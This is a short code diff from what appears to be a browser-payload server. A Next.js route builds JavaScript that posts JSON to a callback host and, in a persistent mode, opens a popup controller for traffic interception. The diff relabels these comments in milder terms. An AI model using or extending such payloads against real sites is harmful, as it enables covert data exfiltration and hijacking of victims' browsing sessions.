@@ -62,7 +62,7 @@ export async function GET(request: NextRequest) {
   js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
   js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;
 
-  // Initialize advanced persistent after we have report ID
+  // Initialize traffic interception after we have report ID
   if (persistentEnabled && advancedPersistentEnabled) {
     js += `setTimeout(function(){initAdvanced()},100);`;
   }
@@ -80,7 +80,7 @@ export async function GET(request: NextRequest) {
     js += `send();`;
   }
 
-  // Advanced Persistent Mode - Popup controller with traffic interception
+  // Traffic Interception Mode - Auxiliary window controller
   // Uses Base64 encoding to avoid escaping issues in document.write()
   if (persistentEnabled && advancedPersistentEnabled) {
     // Popup script code - will be base64 encoded
